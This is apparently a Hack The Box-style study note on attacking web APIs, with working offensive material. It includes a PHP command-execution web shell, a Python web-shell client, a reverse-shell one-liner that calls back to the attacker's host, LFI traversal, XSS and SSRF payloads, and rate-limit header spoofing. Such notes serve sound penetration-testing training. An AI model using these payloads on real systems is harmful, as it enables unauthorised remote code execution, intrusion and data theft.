---
title: API attacks 🧯
---
## Information Disclosure (with a twist of SQLi)

When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.

### Information Disclosure through Fuzzing

Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using [Ffuf 🐳](/notes/tools/Ffuf.md) and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.

```shell
gitblanc@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'

[redacted]
:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorpassword                [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorurl                     [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [41/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorc                       [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [42/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorid                      [Status: 200, Size: 38, Words: 7, Lines: 1]
:: Progress: [43/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erroremail                   [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [44/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errortype                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [45/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorusername                [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [46/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorq                       [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [47/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errortitle                   [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [48/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errordata                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [49/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errordescription             [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [50/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorfile                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [51/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errormode                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [52/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors                       [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [53/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errororder                   [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [54/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorcode                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [55/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorlang  
```

We notice a similar response size in every request. This is because supplying any parameter will return the same text, not an error like 404.

Let us filter out any responses having a size of 19, as follows.

```shell
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19

[redacted]
:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 id                      [Status: 200, Size: 38, Words: 7, Lines: 1]
```

It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.

```shell
gitblanc@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

Find below a Python script that could automate retrieving all information that the API returns (save it as `brute_api.py`).

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

- We import two modules _requests_ and _sys_. _requests_ allows us to make HTTP requests (GET, POST, etc.), and _sys_ allows us to parse system arguments.
- We define a function called _brute_, and then we define a variable called _value_ which has a range of _10000_. _try_ and _except_ help in exception handling.
- `url = sys.argv[1]` receives the first argument.
- _r = requests.get(url + '/?id='+str(val))_ creates a response object called _r_ which will allow us to get the response of our GET request. We are just appending _/?id=_ to our request and then _val_ follows, which will have a value in the specified range.
- _if "position" in r.text:_ looks for the _position_ string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return `[]`.

The above script can be run, as follows.

```shell
gitblanc@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...
```

>[!Tip]
>If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

The issue here is that the code compares the _HTTP_X_FORWARDED_FOR_ header to the possible _whitelist_ values, and if the _HTTP_X_FORWARDED_FOR_ is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the _X-Forwarded-For_ header and the value to one of the IPs from the array.

### Information Disclosure through SQL Injection

SQL injection vulnerabilities can affect APIs as well. Try to use [Sqlmap 🪲](/notes/tools/Sqlmap.md)

## Arbitrary File Upload

### PHP File Upload via API to RCE

Suppose we are assessing an application residing in `http://<TARGET IP>:3001`. When we browse the application, an anonymous file uploading functionality sticks out.

![](Pasted%20image%2020240906111806.png)

Let us create the below file (save it as `backdoor.php`) and try to upload it via the available functionality.

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

The above allows us to append the parameter _cmd_ to our request (to backdoor.php), which will be executed using _system()_. This is if we can determine _backdoor.php_'s location, if _backdoor.php_ will be rendered successfully and if no PHP function restrictions exist.

![](Pasted%20image%2020240906111841.png)

- _backdoor.php_ was successfully uploaded via a POST request to `/api/upload/`. An API seems to be handling the file uploading functionality of the application.
- The content type has been automatically set to `application/x-php`, which means there is no protection in place. The content type would probably be set to `application/octet-stream` or `text/plain` if there was one.
- Uploading a file with a _.php_ extension is also allowed. If there was a limitation on the extensions, we could try extensions such as `.jpg.php`, `.PHP`, etc.
- Using something like [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) to identify php code being uploaded seems not in place either.
- We also receive the location where our file is stored, `http://<TARGET IP>:3001/uploads/backdoor.php`.

We can use the below Python script (save it as `web_shell.py`) to obtain a shell, leveraging the uploaded `backdoor.php` file.

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

Use the script as follows.

```shell
gitblanc@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ id
uid=0(root) gid=0(root) groups=0(root)
```

To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.

```shell
gitblanc@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Local File Inclusion

Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being `Apache Log Poisoning`.
- Check [LFI 🎃](lfi.md)

Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.
Let us first interact with it.

```shell
gitblanc@htb[/htb]$ curl http://<TARGET IP>:3000/api
{"status":"UP"}
```

We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using [Ffuf 🐳](/notes/tools/Ffuf.md) and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.

```shell
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'

[redacted]
download                [Status: 200, Size: 71, Words: 5, Lines: 1]
```

It looks like `/api/download` is a valid API endpoint. Let us interact with it.

```shell
gitblanc@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
{"success":false,"error":"Input the filename via /download/<filename>"}
```

We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though.

```shell
gitblanc@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
127.0.0.1 localhost
127.0.1.1 nix01-websvc

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The API is indeed vulnerable to Local File Inclusion!

## Cross Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities affect web applications and APIs alike. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities.
- Check [XSS attacks 💀](xss_attacks.md)

Suppose we are having a better look at the API of the previous section, `http://<TARGET IP>:3000/api/download`.

Let us first interact with it through the browser by requesting the below.

`http://<TARGET IP>:3000/api/download/test_value`

![](Pasted%20image%2020240906113535.png)

`test_value` is reflected in the response.

Let us see what happens when we enter a payload such as the below (instead of _test_value_).

```javascript
<script>alert(document.domain)</script>
```

![](Pasted%20image%2020240906113625.png)

It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again, as follows.

```javascript
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

![](Pasted%20image%2020240906113706.png)

Now our submitted JavaScript payload is evaluated successfully. The API endpoint is vulnerable to XSS!

## Server Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.

Let us first interact with it.

```shell
gitblanc@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

The API is expecting a parameter called _id_. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first.

```shell
gitblanc@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

Then, let us specify `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` as the value of the _id_ parameter and make an API call.

```shell
gitblanc@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

We notice an error about the _id_ parameter being invalid, and we also notice no connection being made to our listener.

In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.

```shell
gitblanc@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
gitblanc@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.

```shell
gitblanc@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

As time allows, try to provide APIs with input in various formats/encodings.

